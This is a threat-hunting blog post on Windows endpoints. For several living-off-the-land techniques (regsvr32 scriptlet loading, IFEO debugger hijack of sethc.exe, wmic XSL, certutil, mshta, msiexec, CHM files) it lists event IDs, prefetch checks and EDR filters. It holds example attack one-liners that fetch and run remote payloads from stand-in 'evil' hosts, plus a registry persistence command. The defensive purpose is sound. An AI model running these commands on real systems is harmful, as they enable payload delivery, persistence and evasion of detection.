---
layout: post
classes: wide
title:  "Threat Hunting in Windows Endpoints - Part 1"
date:   2024-12-07 01:00:00 +0800
--- 
This post provides details on threat hunting in the machines running in Windows operating system.  

 
### Introduction
Threat hunting in a Windows environment involves the proactive search for indicators of compromise (IOCs) and other malicious artefacts to detect threats. I have listed some of the hunting techniques in the Windows environment.

### **<u>Application Whitelisting Bypass: regsvr32.exe</u>**

In computing, regsvr32 (Microsoft Register Server) is a command-line utility in Microsoft Windows operating systems for registering and unregistering DLLs and ActiveX controls in the Windows Registry. Adversaries can still use Regsvr32.exe on Windows to download and execute files

`regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll`

`regsvr32` is invoking scrobj.dll to unregister COM objects defined in the evil.sct. Malicious code will be used in the sct file.
The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.It does not have to be `.sct`. There will be no artifacts left in registry if this utility is unregistering any COM object.

<u>Detection:</u>
- Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file 
- Command execution and arguments passed to regsvr32.exe using EDR solutions
- Look for suspicious process in the system with parent process as regsvr32
- Hunt for Windows event id 4688 and filter the command arguments with following filter
`regSvr32 /s /n /u /i:http`


Note: Auditing policy for process tracking have to be enabled to trigger 4688 event id and in Advanced Audit Configuration ,
Detailed Tracking have to be enabled for recording process command arguments.

### **<u>Audit log cleared</u>**

Adversaries may clear the Windows audit logs to remove its footpath. Whenver audit logs are cleared , Windows triggers event id 104 or 1102 or 517.Look for these event ids in the machine and start your analysis.

<u>Detection:</u>
- Look for Event IDs 104,1102,517

### **<u>Bypass Authentication</u>**

Image File Execution Options (IFEO) are used for debugging and IFEO settings are stored in the Windows registry. This feature enables the developer to to attach a debugger to the known executables. Malwares exploit this feature for its persistence by adding a debugger to the below executables. whenever the below utilities are triggered, malcious executable will be executed.

`Windows Utilities`:
sethc.exe
magnify.exe
narrator.exe
osk.exe
utilman.exe
displayswitch.exe

`REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d "C:/evil.exe"`

<u>Detection:</u>
  Sweep all the executables under below mentioned registry path  "Image File Execution Options" and look for "debugger" key name.
  
Registry Path:
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe

### **<u>Bypass Proxy using WMIC and Certutil</u>**

WMIC shell is a windows utility that provide command line interface for WMI(Windows Management Instrumentation).This offers various administrative functions to query windows machines to get details such as system settings, process and also to execute scripts. Adversaries use this utility to download malicious payload to evade detections.

`wmic os get /FORMAT:"http://evil/evil[.]xsl"`
XSL script (eXtensible Stylesheet Language). WMI can invoke javascript or VBscript using XSL


Certutil.exe is a command-line program that is installed as part of Certificate Services. You can use Certutil.exe to dump and
display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components,
and verify certificates, key pairs, and certificate chains.
Adversaries use this utility to download malicious payload to evade detections.

`certutil -urlcache -split -f [http[:]//evil] evil[.]txt`
`certutil -decode evil.txt evil.exe`
 decode option used to decode the disguised certificate.

<u>Detection:</u>
- WMIC.exe and Certutil.exe prefetch files and Parsing the prefetch will provide the downloaded file 
- Command execution and arguments passed to wmic.exe and certutil.exe using EDR solutions
- Look for the HTTP useragents with certutil in the network recorders or the proxy logs
- Look for Windows event id 4688 and search the process command arguments with this utility names as a keyword along with below syntax 
`wmic os get /FORMAT:"http:/"`
- Look for http request for file/page ending with XSL from proxy log or Network recorder

### **<u>HTML Application File - Evade Detection</u>**

HTML Application Files (HTA) files is basically a desktop application which is based on HTML format. HTA dynamics are done via java scripting or VB scripts. Malicious codes can be in HTA formats to evade detections. MSHTA.exe is a Windows utility to execute HTA files. Adversaries use his utilities to execute the malicious HTA files.

`mshta.exe https[:]//evil/evil[.]hta`
`mshta evil[.]hta`

<u>Detection:</u>
- Look for MSHTA.exe prefetch files and Parsing the prefetch will provide the executed file 
- Command execution and arguments passed to mshta.exe using EDR solutions.Look for Java script or cscript arguments passed with MSHTA
- Look for suspicious process in the system with parent process as MSHTA
- Look for Windows event id 4688 and search the process command arguments with this utility names as a keyword along with below syntax 
`mshta.exe http`

### **<u>Malicious download using MSIEXEC.exe</u>**

MSIEXEC.exe is a Windows installer utility to install MSI or MSP packages. Adversaries will use these utilities to download 
and execute malicious MSI files.

`MSIEXEC /j m evil[.]msi`
`msiexec /q /i http[:]//evil[.]msi`

<u>Detection:</u>
- Look for MSIEXEC.exe prefetch files and Parsing the prefetch will provide the executed file
- Command execution and arguments passed to msiexec.exe using EDR solutions
- Look for the HTTP useragents with "Windows Installer" in the network recorders or the proxy logs
- Look for suspicious process in the system with parent process as MSIEXEC
- Look for Windows event id 1040,1042(Application log) . Search this utility names as a keyword under provider or source in the event and filter for keyword with "http://"
- Look for Windows event id 4688 and search the process command arguments with this utility names as a keyword along with below syntax
  `msiexec /q /i http`

### **<u>Embed malicious payload in compiled HTML File</u>**

Compiled HTML File (CHM) are commonly Microsoft help files. These file will be a compiled HTML files that includes documents , image , scripts etc.
Hackers will abuse these files to embed malicious payload with CHM files. CHM files can be executed by HH.exe , which is a Microsoft windows utility.
Adversaries use this techniques to evade AV or application blacklisting techniques.

<u>Detection:</u>
- Look for HH.exe prefetch files and Parsing the prefetch will provide the executed CHM file. 
- Command execution and arguments passed to HH.exe using EDR solutions.
- Suspicious process under the parent process HH.exe
- Look for Windows event id 4688 and search this utility name as a keyword

